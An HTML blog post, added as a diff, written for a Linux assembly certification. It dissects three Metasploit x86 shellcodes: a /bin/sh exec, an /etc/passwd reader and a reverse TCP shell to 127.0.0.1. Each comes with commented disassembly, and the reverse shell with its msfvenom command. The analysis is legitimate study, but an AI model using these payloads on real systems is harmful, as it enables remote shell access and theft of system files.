@@ -1,0 +1,562 @@
+<!doctype html><html lang=en-us>
+<head>
+<link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
+<link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
+<link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous>
+<link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous>
+<script type=text/javascript src=https://latest.cactus.chat/cactus.js></script>
+<link rel=stylesheet href=https://latest.cactus.chat/style.css type=text/css>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<title> SLAE x86 - Assignment 0x5 | jsn></title>
+<link rel=canonical href=https://jsnv.dev/posts/slae_x86_a5/>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=robots content="all,follow">
+<meta name=googlebot content="index,follow,snippet,archive">
+<meta property="og:title" content="SLAE x86 - Assignment 0x5">
+<meta property="og:description" content="Shellcode Analysis Objectives  Take up at least 3 shellcode samples created using msfpayload for linux/x86 Use GDB/ndisasm/libemu to dissect the functionality of the shellcode Present analysis  MSFvenom The msfpayload has been replaced already by msfvenom. It is the combination of msfpayload and msfencode. See more details from Rapid7&rsquo;s blog
+MSF Exec Shellcode Using msfvenom, a shellcode utilizing execve syscall to execute /bin/sh can be generated. See screenshot below showing how to extract the nasm code by passing the shellcode into ndisasm tool:">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://jsnv.dev/posts/slae_x86_a5/"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-10-23T01:10:31+00:00">
+<meta property="article:modified_time" content="2021-10-23T01:10:31+00:00">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="SLAE x86 - Assignment 0x5">
+<meta name=twitter:description content="Shellcode Analysis Objectives  Take up at least 3 shellcode samples created using msfpayload for linux/x86 Use GDB/ndisasm/libemu to dissect the functionality of the shellcode Present analysis  MSFvenom The msfpayload has been replaced already by msfvenom. It is the combination of msfpayload and msfencode. See more details from Rapid7&rsquo;s blog
+MSF Exec Shellcode Using msfvenom, a shellcode utilizing execve syscall to execute /bin/sh can be generated. See screenshot below showing how to extract the nasm code by passing the shellcode into ndisasm tool:">
+<link rel=stylesheet href=https://jsnv.dev/css/styles.9479e3a8e1c8ac41c28e4e18ad549766e3ce2e4e49cab5d83920f533288fc6ac9a9d4f224545bce5d12c4132b271982f4c421aa0c6a8e548abbbddf171e1caeb.css integrity="sha512-lHnjqOHIrEHCjk4YrVSXZuPOLk5JyrXYOSD1MyiPxqyanU8iRUW85dEsQTKycZgvTEIaoMao5Uiru93xceHK6w=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script>
+<script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]-->
+<link rel=icon type=image/png href=https://jsnv.dev/images/favicon.ico>
+</head>
+<body class="max-width mx-auto px3 ltr">
+<div class="content index py4">
+<div id=header-post>
+<a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
+<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
+<a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast')" style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+<span id=menu>
+<span id=nav>
+<ul>
+<li><a href=/>~/</a></li>
+<li><a href=/posts>~/posts</a></li>
+<li><a href=/tags>~/tags</a></li>
+<li><a href=/about>~/about</a></li>
+<li><a href=/work>~/work</a></li>
+</ul>
+</span>
+<br>
+<span id=actions>
+<ul>
+<li>
+<a class=icon href=https://jsnv.dev/posts/slae_x86_a4/ aria-label=Previous>
+<i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle()" onmouseout="$('#i-prev').toggle()"></i>
+</a>
+</li>
+<li>
+<a class=icon href=https://jsnv.dev/posts/slae_x86_a6/ aria-label=Next>
+<i class="fas fa-chevron-right" aria-hidden=true onmouseover="$('#i-next').toggle()" onmouseout="$('#i-next').toggle()"></i>
+</a>
+</li>
+<li>
+<a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
+<i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle()" onmouseout="$('#i-top').toggle()"></i>
+</a>
+</li>
+<li>
+<a class=icon href=# aria-label=Share>
+<i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle()" onmouseout="$('#i-share').toggle()" onclick="return $('#share').toggle(),!1"></i>
+</a>
+</li>
+</ul>
+<span id=i-prev class=info style=display:none>Previous post</span>
+<span id=i-next class=info style=display:none>Next post</span>
+<span id=i-top class=info style=display:none>Back to top</span>
+<span id=i-share class=info style=display:none>Share post</span>
+</span>
+<br>
+<div id=share style=display:none>
+<ul>
+<li>
+<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f" aria-label=Facebook>
+<i class="fab fa-facebook" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&text=SLAE%20x86%20-%20Assignment%200x5" aria-label=Twitter>
+<i class="fab fa-twitter" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&title=SLAE%20x86%20-%20Assignment%200x5" aria-label=Linkedin>
+<i class="fab fa-linkedin" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&is_video=false&description=SLAE%20x86%20-%20Assignment%200x5" aria-label=Pinterest>
+<i class="fab fa-pinterest" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="mailto:?subject=SLAE%20x86%20-%20Assignment%200x5&body=Check out this article: https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f" aria-label=Email>
+<i class="fas fa-envelope" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&title=SLAE%20x86%20-%20Assignment%200x5" aria-label=Pocket>
+<i class="fab fa-get-pocket" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&title=SLAE%20x86%20-%20Assignment%200x5" aria-label=reddit>
+<i class="fab fa-reddit" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&name=SLAE%20x86%20-%20Assignment%200x5&description=Shellcode%20Analysis%20Objectives%20%20Take%20up%20at%20least%203%20shellcode%20samples%20created%20using%20msfpayload%20for%20linux%2fx86%20Use%20GDB%2fndisasm%2flibemu%20to%20dissect%20the%20functionality%20of%20the%20shellcode%20Present%20analysis%20%20MSFvenom%20The%20msfpayload%20has%20been%20replaced%20already%20by%20msfvenom.%20It%20is%20the%20combination%20of%20msfpayload%20and%20msfencode.%20See%20more%20details%20from%20Rapid7%26rsquo%3bs%20blog%0aMSF%20Exec%20Shellcode%20Using%20msfvenom%2c%20a%20shellcode%20utilizing%20execve%20syscall%20to%20execute%20%2fbin%2fsh%20can%20be%20generated.%20See%20screenshot%20below%20showing%20how%20to%20extract%20the%20nasm%20code%20by%20passing%20the%20shellcode%20into%20ndisasm%20tool%3a" aria-label=Tumblr>
+<i class="fab fa-tumblr" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&t=SLAE%20x86%20-%20Assignment%200x5" aria-label="Hacker News">
+<i class="fab fa-hacker-news" aria-hidden=true></i>
+</a>
+</li>
+</ul>
+</div>
+<div id=toc>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#objectives>Objectives</a></li>
+<li><a href=#msfvenom>MSFvenom</a></li>
+<li><a href=#msf-exec-shellcode>MSF Exec Shellcode</a></li>
+<li><a href=#msf-read-file-shellcode>MSF Read File Shellcode</a>
+<ul>
+<li><a href=#open2>Open(2)</a></li>
+<li><a href=#read2>Read(2)</a></li>
+<li><a href=#write2>Write(2)</a></li>
+<li><a href=#exit2>Exit(2)</a></li>
+</ul>
+</li>
+<li><a href=#msf-reverse-tcp-shellcode>MSF Reverse TCP Shellcode</a></li>
+</ul>
+</nav>
+</div>
+</span>
+</div>
+<article class=post itemscope itemtype=http://schema.org/BlogPosting>
+<header>
+<h1 class=posttitle itemprop="name headline">
+SLAE x86 - Assignment 0x5
+</h1>
+<div class=meta>
+<div class=postdate>
+<time datetime="2021-10-23 01:10:31 +0000 UTC" itemprop=datePublished>2021-10-23</time>
+</div>
+<div class=article-read-time>
+<i class="far fa-clock"></i>
+5 minute read
+</div>
+<div class=article-category>
+<i class="fas fa-archive"></i>
+<a class=category-link href=/categories/certification>certification</a>
+</div>
+<div class=article-tag>
+<i class="fas fa-tag"></i>
+<a class=tag-link href=/tags/exploit_dev rel=tag>exploit_dev</a>
+,
+<a class=tag-link href=/tags/assembly rel=tag>assembly</a>
+</div>
+</div>
+</header>
+<div class=content itemprop=articleBody>
+<h1 id=shellcode-analysis>Shellcode Analysis</h1>
+<h2 id=objectives>Objectives</h2>
+<ul>
+<li>Take up at least 3 shellcode samples created using msfpayload for linux/x86</li>
+<li>Use GDB/ndisasm/libemu to dissect the functionality of the shellcode</li>
+<li>Present analysis</li>
+</ul>
+<h2 id=msfvenom>MSFvenom</h2>
+<p>The <a href=https://www.offensive-security.com/metasploit-unleashed/msfpayload/>msfpayload</a> has been replaced already by <a href=https://www.offensive-security.com/metasploit-unleashed/msfvenom/>msfvenom</a>. It is the combination of msfpayload and <a href=https://www.offensive-security.com/metasploit-unleashed/msfencode/>msfencode</a>. See more details from <a href=https://www.rapid7.com/blog/post/2014/12/09/good-bye-msfpayload-and-msfencode/>Rapid7&rsquo;s blog</a></p>
+<h2 id=msf-exec-shellcode>MSF Exec Shellcode</h2>
+<p>Using <a href=#msfvenom>msfvenom</a>, a shellcode utilizing <code>execve</code> syscall to execute <code>/bin/sh</code> can be generated. See screenshot below showing how to extract the nasm code by passing the shellcode into <code>ndisasm</code> tool:</p>
+<p><img src=Pasted%20image%2020211023095223.png alt></p>
+<p>Some explanation via comments inline in every instruction are shown in the nasm code below, the first two columns are removed to have proper highlighting of the code:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=k>global</span> <span class=nv>_start</span>
+
+<span class=k>section</span> <span class=nv>.text</span>
+
+<span class=nl>_start:</span>
+  <span class=nf>push</span> <span class=kt>byte</span> <span class=o>+</span><span class=mh>0xb</span>          <span class=c1>; push 0xb into stack</span>
+  <span class=nf>pop</span> <span class=nb>eax</span>                 <span class=c1>; execve(2) code</span>
+  <span class=nf>cdq</span>                     <span class=c1>; clear edx</span>
+  <span class=nf>push</span> <span class=nb>edx</span>                <span class=c1>; push NULL</span>
+  <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x632d</span>        <span class=c1>; push &#39;-c&#39;</span>
+  <span class=nf>mov</span> <span class=nb>edi</span><span class=p>,</span><span class=nb>esp</span>             <span class=c1>; edi = &#39;-c&#39; address in stack</span>
+  <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x68732f</span>     <span class=c1>; push &#39;/sh&#39;, esp = &#39;/sh&#39;</span>
+  <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x6e69622f</span>   <span class=c1>; push &#39;/bin&#39;, esp = &#39;/bin/sh&#39;</span>
+  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span><span class=nb>esp</span>             <span class=c1>; ebx = esp_address</span>
+  <span class=nf>push</span> <span class=nb>edx</span>                <span class=c1>; push NULL</span>
+  <span class=nf>call</span> <span class=mh>0x20</span>               <span class=c1>; jump to 0x20 and push next instruction&#39;s address into stack</span>
+  <span class=nf>jnc</span> <span class=mh>0x87</span>                <span class=c1>; equivalent to &#34;sh&#34;</span>
+                          <span class=c1>; using gdb, 0x20 is: push edi; push ebx</span>
+                          <span class=c1>; see screenshot following this code block</span>
+  <span class=nf>add</span> <span class=p>[</span><span class=nb>edi</span><span class=o>+</span><span class=mh>0x53</span><span class=p>],</span><span class=nb>dl</span>       <span class=c1>; esp = &#34;/bin/sh -c sh&#34;</span>
+  <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span><span class=nb>esp</span>             <span class=c1>; ecx = esp_address</span>
+  <span class=nf>int</span> <span class=mh>0x80</span>                <span class=c1>; syscall execve(first_binsh_addr, second_binsh_addr, NULL)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Checking with GDB, as mentioned in line 18 the address 0x20 contains the following instructions:</p>
+<p><img src=Pasted%20image%2020211023100713.png alt></p>
+<p>Furthermore, after the call function, <code>sh</code> string&rsquo;s address is pushed into the stack:</p>
+<p><img src=Pasted%20image%2020211023101329.png alt></p>
+<p>See the changes in the stack and registers while executing the the instructions one-by-one:</p>
+<p><img src=msf_exec.gif alt></p>
+<h2 id=msf-read-file-shellcode>MSF Read File Shellcode</h2>
+<p>Using <a href=#msfvenom>msfvenom</a>, a shellcode utilizing <code>open - read - write - exit</code> can be generated to read a file within the system specified by the <code>PATH</code>. See screenshot below showing how to extract the nasm code by passing the shellcode into <code>ndisasm</code> tool:</p>
+<p><img src=Pasted%20image%2020211023104015.png alt></p>
+<p>The same approach with <a href=#msf-exec-shellcode>previous section</a>, see the nasmi code below containing the explanation inline with the instructions:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=k>global</span> <span class=nv>_start</span>
+
+<span class=k>section</span> <span class=nv>.text</span>
+
+<span class=nl>_start:</span>
+  <span class=nf>jmp</span> <span class=nv>short</span> <span class=mh>0x38</span>  <span class=c1>; jump to call 0x2</span>
+  <span class=nf>mov</span> <span class=nb>eax</span><span class=p>,</span><span class=mh>0x5</span>     <span class=c1>; open(2)</span>
+  <span class=nf>pop</span> <span class=nb>ebx</span>         <span class=c1>; address of &#34;/etc/passwd\x00&#34;</span>
+  <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span><span class=nb>ecx</span>     <span class=c1>; clear ecx</span>
+  <span class=nf>int</span> <span class=mh>0x80</span>        <span class=c1>; syscall open(&#34;/etc/passwd\x00&#34;, NULL)</span>
+
+  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span><span class=nb>eax</span>     <span class=c1>; ebx = fd</span>
+  <span class=nf>mov</span> <span class=nb>eax</span><span class=p>,</span><span class=mh>0x3</span>     <span class=c1>; read(2)</span>
+  <span class=nf>mov</span> <span class=nb>edi</span><span class=p>,</span><span class=nb>esp</span>     <span class=c1>; edi = esp</span>
+  <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span><span class=nb>edi</span>     <span class=c1>; ecx = esp address</span>
+  <span class=nf>mov</span> <span class=nb>edx</span><span class=p>,</span><span class=mh>0x1000</span>  <span class=c1>; edx = 4096</span>
+  <span class=nf>int</span> <span class=mh>0x80</span>        <span class=c1>; syscall read(fd, &#34;/etc/passwd\x00&#34;, 4096)</span>
+
+  <span class=nf>mov</span> <span class=nb>edx</span><span class=p>,</span><span class=nb>eax</span>     <span class=c1>; edx = read size</span>
+  <span class=nf>mov</span> <span class=nb>eax</span><span class=p>,</span><span class=mh>0x4</span>     <span class=c1>; write(2)</span>
+  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span><span class=mh>0x1</span>     <span class=c1>; fd = stdout</span>
+  <span class=nf>int</span> <span class=mh>0x80</span>        <span class=c1>; syscall write(stdout, &#34;/etc/passwd\x00&#34;, read_size)</span>
+
+  <span class=nf>mov</span> <span class=nb>eax</span><span class=p>,</span><span class=mh>0x1</span>     <span class=c1>; _exit(2)</span>
+  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span><span class=mh>0x0</span>     <span class=c1>; clear ebx</span>
+  <span class=nf>int</span> <span class=mh>0x80</span>        <span class=c1>; syscall _exit</span>
+  <span class=nf>call</span> <span class=mh>0x2</span>        <span class=c1>; jump to mov eax,0x5 and push &#34;/etc/passwd\x00&#34; address into stack</span>
+
+                  <span class=c1>; 3D-48 = &#34;/etc/passwd\x00&#34;, see screenshot after this code block</span>
+  <span class=nf>das</span>             <span class=c1>; 0000003D  2F</span>
+  <span class=nf>gs</span> <span class=nv>jz</span> <span class=mh>0xa4</span>      <span class=c1>; 0000003E  657463</span>
+  <span class=nf>das</span>             <span class=c1>; 00000041  2F</span>
+  <span class=nf>jo</span> <span class=mh>0xa5</span>         <span class=c1>; 00000042  7061</span>
+  <span class=nf>jnc</span> <span class=mh>0xb9</span>        <span class=c1>; 00000044  7373</span>
+  <span class=nf>ja</span> <span class=mh>0xac</span>         <span class=c1>; 00000046  7764</span>
+  <span class=kd>db</span> <span class=mh>0x00</span>         <span class=c1>; 00000048  00</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>A pry session below shows the conversion of the shellcode bytes in lines 30 - 36 into string</p>
+<p><img src=Pasted%20image%2020211023105353.png alt></p>
+<p>The next screenshots will be showing the status of the registers and stack right before every syscall:</p>
+<h3 id=open2>Open(2)</h3>
+<p><img src=Pasted%20image%2020211023110040.png alt></p>
+<h3 id=read2>Read(2)</h3>
+<p><img src=Pasted%20image%2020211023110723.png alt></p>
+<h3 id=write2>Write(2)</h3>
+<p><img src=Pasted%20image%2020211023110404.png alt></p>
+<h3 id=exit2>Exit(2)</h3>
+<p><img src=Pasted%20image%2020211023110512.png alt></p>
+<h2 id=msf-reverse-tcp-shellcode>MSF Reverse TCP Shellcode</h2>
+<p>Using <a href=#msfvenom>msfvenom</a>, a reverse TCP shellcode can be generated with payload shell_reverse_tcp specifying the <code>LHOST</code> and <code>LPORT</code>, the listeing IP and port. See screenshot below showing how to extract the nasm code by passing the shellcode into <code>ndisasm</code> tool:</p>
+<p><img src=Pasted%20image%2020211023111233.png alt></p>
+<p>To better visualize the execution flow of the instructions, see the graph generated using <a href=https://github.com/buffer/libemu><code>libemu's sctest</code></a> and <a href=https://graphviz.org/><code>dot tool</code></a> (the tools same used in <a href=../slae_x86_a2#structure>Reverse TCP Shellcode Assignment</a>) below:</p>
+<p><img src=reverse_tcp_shellcode.png alt></p>
+<p>Generated using:</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh>msfvenom --arch x86 --platform linux -p linux/x86/shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>127.0.0.1 <span class=nv>LPORT</span><span class=o>=</span><span class=m>1234</span> -f raw <span class=p>|</span> sctest -vvv -Ss <span class=m>10000</span> -G reverse_tcp_shellcode.dot
+dot reverse_tcp_shellcode.dot -T png -o reverse_tcp_shellcode.png
+</code></pre></div><p>As with previous two shellcodes, see the nasm code below with inline comments for explanation of the instructions:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=k>global</span> <span class=nv>_start</span>
+
+<span class=k>section</span> <span class=nv>.text</span>
+
+<span class=nl>_start:</span>
+ <span class=nf>xor</span> <span class=nb>ebx</span><span class=p>,</span><span class=nb>ebx</span>           <span class=c1>; clear ebx</span>
+ <span class=nf>mul</span> <span class=nb>ebx</span>               <span class=c1>; clear eax and edx</span>
+ <span class=nf>push</span> <span class=nb>ebx</span>              <span class=c1>; push NULL</span>
+ <span class=nf>inc</span> <span class=nb>ebx</span>               <span class=c1>; ebx = 0x1</span>
+ <span class=nf>push</span> <span class=nb>ebx</span>              <span class=c1>; push 0x1 ; SOCK_STREAM</span>
+ <span class=nf>push</span> <span class=kt>byte</span> <span class=o>+</span><span class=mh>0x2</span>        <span class=c1>; push 0x2 ; AF_INET</span>
+ <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span><span class=nb>esp</span>           <span class=c1>; ecx = esp address</span>
+ <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span><span class=mh>0x66</span>           <span class=c1>; socketcall(2)</span>
+ <span class=nf>int</span> <span class=mh>0x80</span>              <span class=c1>; syscall(SYS_socketcall, SYS_SOCKET = 0x1,</span>
+                       <span class=c1>;         *args(AF_INET, SOCK_STREAM))</span>
+                       <span class=c1>; source: /usr/include/linux/net.h</span>
+
+ <span class=nf>xchg</span> <span class=nb>eax</span><span class=p>,</span><span class=nb>ebx</span>          <span class=c1>; ebx = sockfd, eax = 0x1</span>
+ <span class=nf>pop</span> <span class=nb>ecx</span>               <span class=c1>; ecx = 0x2</span>
+ <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span><span class=mh>0x3f</span>           <span class=c1>; dup2(2)</span>
+ <span class=nf>int</span> <span class=mh>0x80</span>              <span class=c1>; syscall dup2(sockfd, fd)</span>
+ <span class=nf>dec</span> <span class=nb>ecx</span>               <span class=c1>; decrement ecx by 1 to cover file descriptors 2, 1, and 0</span>
+ <span class=nf>jns</span> <span class=mh>0x11</span>              <span class=c1>; jump to al, 0x3f to start dup2 again until ecx = 0x0</span>
+
+ <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x100007f</span>  <span class=c1>; push IP_ADDR = 127.0.0.1</span>
+ <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0xd2040002</span> <span class=c1>; push PORT = 1234(0xd204) and AF_INET = 0x0002</span>
+ <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span><span class=nb>esp</span>           <span class=c1>; ecx = esp_address(sockaddr {AF_INET; PORT; IP_ADDR})</span>
+ <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span><span class=mh>0x66</span>           <span class=c1>; socketcall(2)</span>
+ <span class=nf>push</span> <span class=nb>eax</span>              <span class=c1>; push 0x66</span>
+ <span class=nf>push</span> <span class=nb>ecx</span>              <span class=c1>; push esp_address(sockaddr {AF_INET; PORT; IP_ADDR})</span>
+ <span class=nf>push</span> <span class=nb>ebx</span>              <span class=c1>; push sockfd</span>
+ <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span><span class=mh>0x3</span>            <span class=c1>; ebx = 0x3</span>
+ <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span><span class=nb>esp</span>           <span class=c1>; ecx = esp_address(sockfd, sockaddr, 0x66)</span>
+ <span class=nf>int</span> <span class=mh>0x80</span>              <span class=c1>; syscall(SYS_socketcall, SYS_CONNECT = 0x3, *args(esp_address))</span>
+
+ <span class=nf>push</span> <span class=nb>edx</span>              <span class=c1>; push NULL</span>
+ <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x68732f6e</span> <span class=c1>; push &#34;n/sh&#34;</span>
+ <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x69622f2f</span> <span class=c1>; push &#34;//bi&#34;</span>
+ <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span><span class=nb>esp</span>           <span class=c1>; ebx = esp_address(&#34;//bin/sh&#34;)</span>
+ <span class=nf>push</span> <span class=nb>edx</span>              <span class=c1>; push NULL</span>
+ <span class=nf>push</span> <span class=nb>ebx</span>              <span class=c1>; push esp_address</span>
+ <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span><span class=nb>esp</span>           <span class=c1>; ecx = esp_address(esp_address(&#34;//bin/sh&#34;), NULL)</span>
+ <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span><span class=mh>0xb</span>            <span class=c1>; execve(2)</span>
+ <span class=nf>int</span> <span class=mh>0x80</span>              <span class=c1>; syscall execve(first_binsh_addr, second_binsh_addr, NULL)</span>
+</code></pre></td></tr></table>
+</div>
+</div><hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href=http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+<p>Student ID: SLAE - 1558</p>
+<hr>
+<p><a href=https://github.com/jsnv-dev/slae_x86_assignments/tree/main/A5><code>Link to Github repository</code></a> | <a href=../slae_x86><code>Link to index page</code></a></p>
+</div>
+</article>
+<div id=footer-post-container>
+<div id=footer-post>
+<div id=nav-footer style=display:none>
+<ul>
+<li><a href=/>~/</a></li>
+<li><a href=/posts>~/posts</a></li>
+<li><a href=/tags>~/tags</a></li>
+<li><a href=/about>~/about</a></li>
+<li><a href=/work>~/work</a></li>
+</ul>
+</div>
+<div id=toc-footer style=display:none>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#objectives>Objectives</a></li>
+<li><a href=#msfvenom>MSFvenom</a></li>
+<li><a href=#msf-exec-shellcode>MSF Exec Shellcode</a></li>
+<li><a href=#msf-read-file-shellcode>MSF Read File Shellcode</a>
+<ul>
+<li><a href=#open2>Open(2)</a></li>
+<li><a href=#read2>Read(2)</a></li>
+<li><a href=#write2>Write(2)</a></li>
+<li><a href=#exit2>Exit(2)</a></li>
+</ul>
+</li>
+<li><a href=#msf-reverse-tcp-shellcode>MSF Reverse TCP Shellcode</a></li>
+</ul>
+</nav>
+</div>
+<div id=share-footer style=display:none>
+<ul>
+<li>
+<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f" aria-label=Facebook>
+<i class="fab fa-facebook fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&text=SLAE%20x86%20-%20Assignment%200x5" aria-label=Twitter>
+<i class="fab fa-twitter fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&title=SLAE%20x86%20-%20Assignment%200x5" aria-label=Linkedin>
+<i class="fab fa-linkedin fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&is_video=false&description=SLAE%20x86%20-%20Assignment%200x5" aria-label=Pinterest>
+<i class="fab fa-pinterest fa-lg" aria-hidden=true></i>
+</a>
